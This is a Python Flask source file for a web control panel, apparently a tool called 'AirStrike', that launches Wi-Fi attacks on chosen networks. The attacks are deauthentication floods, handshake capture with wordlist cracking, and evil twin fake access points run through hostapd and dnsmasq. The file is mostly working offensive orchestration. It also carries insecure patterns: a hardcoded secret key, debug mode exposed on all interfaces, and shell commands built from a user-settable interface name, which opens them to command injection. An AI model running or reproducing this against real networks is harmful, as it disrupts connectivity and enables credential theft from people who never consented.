from flask import Flask, render_template, jsonify, request, flash, redirect, url_for
import sys
import os
import json
import threading
import time

# Add parent directory to path for imports
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

# Import AirStrike modules
from utils.network_utils import run_scan, set_monitor_mode, set_managed_mode
from attacks.deauth_attack import deauth_worker
from attacks.capture_attack import capture_worker
from attacks.evil_twin import create_hostapd_config, create_dnsmasq_config, setup_fake_ap_network

# Global variables
app = Flask(__name__)
app.secret_key = 'airstrike_secret_key'

# Configuration
config = {
    'interface': 'wlan0',
    'wordlist': '/usr/share/wordlists/rockyou.txt',
    'output_dir': './captures/'
}

# Attack state
attack_state = {
    'running': False,
    'attack_type': None,
    'target_network': None,
    'progress': 0,
    'log': [],
    'stop_event': None,
    'threads': []
}

# Statistics
stats = {
    'networks_count': 0,
    'attacks_count': 0,
    'captures_count': 0
}

# Routes
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/scan')
def scan():
    return render_template('scan.html')

@app.route('/attack')
def attack():
    return render_template('attack.html')

@app.route('/results')
def results():
    return render_template('results.html')

@app.route('/settings')
def settings():
    # Get available interfaces
    interfaces = get_available_interfaces()
    return render_template('settings.html', 
                          interfaces=interfaces, 
                          current_interface=config['interface'],
                          default_wordlist=config['wordlist'],
                          output_dir=config['output_dir'])

# API Endpoints
@app.route('/scan_wifi')
def scan_wifi():
    try:
        networks = run_scan(config['interface'])
        # Update stats
        stats['networks_count'] = len(networks)
        return jsonify(networks)
    except Exception as e:
        app.logger.error(f"Error scanning networks: {e}")
        return jsonify([]), 500

@app.route('/get_interfaces')
def get_interfaces():
    interfaces = get_available_interfaces()
    return jsonify({
        'interfaces': interfaces,
        'current_interface': config['interface']
    })

@app.route('/set_interface', methods=['POST'])
def set_interface():
    data = request.json
    if 'interface' in data:
        config['interface'] = data['interface']
        return jsonify({'success': True})
    return jsonify({'success': False, 'error': 'No interface provided'})

@app.route('/save_wordlist', methods=['POST'])
def save_wordlist():
    data = request.json
    if 'wordlist' in data:
        config['wordlist'] = data['wordlist']
        return jsonify({'success': True})
    return jsonify({'success': False, 'error': 'No wordlist provided'})

@app.route('/save_output_dir', methods=['POST'])
def save_output_dir():
    data = request.json
    if 'output_dir' in data:
        config['output_dir'] = data['output_dir']
        # Create directory if it doesn't exist
        os.makedirs(config['output_dir'], exist_ok=True)
        return jsonify({'success': True})
    return jsonify({'success': False, 'error': 'No output directory provided'})

@app.route('/start_attack', methods=['POST'])
def start_attack():
    global attack_state
    
    # Check if an attack is already running
    if attack_state['running']:
        return jsonify({'success': False, 'error': 'An attack is already running'})
    
    data = request.json
    if not data or 'network' not in data or 'attack_type' not in data:
        return jsonify({'success': False, 'error': 'Missing required parameters'})
    
    # Get attack parameters
    network = data['network']
    attack_type = data['attack_type']
    attack_config = data.get('config', {})
    
    # Initialize attack state
    attack_state['running'] = True
    attack_state['attack_type'] = attack_type
    attack_state['target_network'] = network
    attack_state['progress'] = 0
    attack_state['log'] = []
    attack_state['stop_event'] = threading.Event()
    attack_state['threads'] = []
    
    # Log the start of the attack
    log_message(f"Starting {attack_type} attack on {network['essid']} ({network['bssid']})")
    
    try:
        # Launch the appropriate attack
        if attack_type == 'deauth':
            launch_deauth_attack(network, attack_config)
        elif attack_type == 'handshake':
            launch_handshake_attack(network, attack_config)
        elif attack_type == 'evil_twin':
            launch_evil_twin_attack(network, attack_config)
        else:
            attack_state['running'] = False
            return jsonify({'success': False, 'error': f'Unknown attack type: {attack_type}'})
        
        # Update stats
        stats['attacks_count'] += 1
        
        return jsonify({'success': True})
    except Exception as e:
        attack_state['running'] = False
        app.logger.error(f"Error starting attack: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/stop_attack', methods=['POST'])
def stop_attack():
    global attack_state
    
    if not attack_state['running']:
        return jsonify({'success': False, 'error': 'No attack is running'})
    
    try:
        # Signal threads to stop
        if attack_state['stop_event']:
            attack_state['stop_event'].set()
        
        # Wait for threads to finish
        for thread in attack_state['threads']:
            thread.join(timeout=2)
        
        # Reset interface to managed mode
        set_managed_mode(config['interface'])
        
        # Update attack state
        attack_state['running'] = False
        log_message("Attack stopped")
        
        return jsonify({'success': True})
    except Exception as e:
        app.logger.error(f"Error stopping attack: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/attack_status')
def attack_status():
    return jsonify({
        'running': attack_state['running'],
        'attack_type': attack_state['attack_type'],
        'target_network': attack_state['target_network'],
        'progress': attack_state['progress']
    })

@app.route('/attack_log')
def attack_log():
    return jsonify({
        'log': attack_state['log']
    })

@app.route('/dashboard_stats')
def dashboard_stats():
    return jsonify(stats)

# Helper functions
def get_available_interfaces():
    # This is a placeholder - in a real implementation, you would
    # use a library like netifaces or subprocess to get actual interfaces
    return ['wlan0', 'wlan1', 'eth0']

def log_message(message):
    timestamp = time.strftime("%H:%M:%S")
    formatted_message = f"[{timestamp}] {message}"
    attack_state['log'].append(formatted_message)
    app.logger.info(formatted_message)

def update_progress(progress):
    attack_state['progress'] = min(100, max(0, progress))

def launch_deauth_attack(network, attack_config):
    # Extract parameters
    bssid = network['bssid']
    channel = int(network['channel'])
    client = attack_config.get('client', 'FF:FF:FF:FF:FF:FF')
    count = attack_config.get('count', 10)
    interval = attack_config.get('interval', 0.1)
    
    # Set monitor mode
    set_monitor_mode(config['interface'])
    log_message(f"Interface {config['interface']} set to monitor mode")
    
    # Set channel
    try:
        os.system(f"iwconfig {config['interface']} channel {channel}")
        log_message(f"Channel set to {channel}")
    except Exception as e:
        log_message(f"Error setting channel: {e}")
        set_managed_mode(config['interface'])
        raise
    
    # Start deauth thread
    deauth_thread = threading.Thread(
        target=deauth_worker,
        args=(bssid, client, config['interface'], count, interval, attack_state['stop_event']),
        daemon=True
    )
    
    attack_state['threads'].append(deauth_thread)
    deauth_thread.start()
    log_message("Deauthentication attack started")

def launch_handshake_attack(network, attack_config):
    # Extract parameters
    bssid = network['bssid']
    channel = int(network['channel'])
    duration = attack_config.get('duration', 5)
    wordlist = attack_config.get('wordlist', config['wordlist'])
    
    # Create output directory
    safe_bssid = bssid.replace(':', '-')
    output_dir = os.path.join(config['output_dir'], safe_bssid)
    os.makedirs(output_dir, exist_ok=True)
    cap_file = os.path.join(output_dir, "capture-01.cap")
    
    # Set monitor mode
    set_monitor_mode(config['interface'])
    log_message(f"Interface {config['interface']} set to monitor mode")
    
    # Start capture thread
    capture_thread = threading.Thread(
        target=capture_worker,
        args=(bssid, channel, config['interface'], duration, 
              os.path.join(output_dir, "capture"), cap_file, wordlist, 
              attack_state['stop_event']),
        daemon=True
    )
    
    # Start deauth thread
    deauth_thread = threading.Thread(
        target=deauth_worker,
        args=(bssid, "FF:FF:FF:FF:FF:FF", config['interface'], 10, 0.1, attack_state['stop_event']),
        daemon=True
    )
    
    attack_state['threads'].extend([capture_thread, deauth_thread])
    capture_thread.start()
    log_message("Handshake capture started")
    
    # Wait a bit before starting deauth
    time.sleep(2)
    deauth_thread.start()
    log_message("Deauthentication flood started")
    
    # Update stats when a handshake is captured
    stats['captures_count'] += 1

def launch_evil_twin_attack(network, attack_config):
    # Extract parameters
    bssid = network['bssid']
    ssid = network['essid']
    channel = attack_config.get('channel', int(network['channel']))
    captive_portal = attack_config.get('captive_portal', False)
    
    # Create output directory
    safe_ssid = "".join(c if c.isalnum() else "_" for c in ssid)
    output_dir = os.path.join(config['output_dir'], "evil_twin", safe_ssid)
    os.makedirs(output_dir, exist_ok=True)
    
    # Set managed mode
    set_managed_mode(config['interface'])
    log_message(f"Interface {config['interface']} set to managed mode")
    
    # Create config files
    hostapd_conf = create_hostapd_config(config['interface'], ssid, channel)
    dnsmasq_conf = create_dnsmasq_config(config['interface'])
    
    if hostapd_conf and dnsmasq_conf:
        # Setup network
        setup_fake_ap_network(config['interface'])
        log_message("Fake AP network setup complete")
        
        # Start hostapd
        hostapd_thread = threading.Thread(
            target=run_hostapd,
            args=(hostapd_conf, attack_state['stop_event']),
            daemon=True
        )
        
        # Start dnsmasq
        dnsmasq_thread = threading.Thread(
            target=run_dnsmasq,
            args=(dnsmasq_conf, attack_state['stop_event']),
            daemon=True
        )
        
        attack_state['threads'].extend([hostapd_thread, dnsmasq_thread])
        hostapd_thread.start()
        dnsmasq_thread.start()
        log_message("Evil Twin attack started")
        
        # Start captive portal if enabled
        if captive_portal:
            # This would be implemented in a real scenario
            log_message("Captive portal functionality not implemented yet")
    else:
        raise Exception("Failed to create required configuration files")

def run_hostapd(config_file, stop_event):
    try:
        log_message(f"Starting hostapd with config: {config_file}")
        process = os.popen(f"hostapd {config_file}")
        
        while not stop_event.is_set():
            line = process.readline()
            if line:
                log_message(f"[hostapd] {line.strip()}")
            time.sleep(0.1)
            
        process.close()
    except Exception as e:
        log_message(f"Error in hostapd: {e}")

def run_dnsmasq(config_file, stop_event):
    try:
        log_message(f"Starting dnsmasq with config: {config_file}")
        process = os.popen(f"dnsmasq -C {config_file} -d")
        
        while not stop_event.is_set():
            line = process.readline()
            if line:
                log_message(f"[dnsmasq] {line.strip()}")
            time.sleep(0.1)
            
        process.close()
    except Exception as e:
        log_message(f"Error in dnsmasq: {e}")

# Run the application
if __name__ == '__main__':
    # Create output directory if it doesn't exist
    os.makedirs(config['output_dir'], exist_ok=True)
    
    # Run the Flask app
    app.run(debug=True, host='0.0.0.0', port=5000)
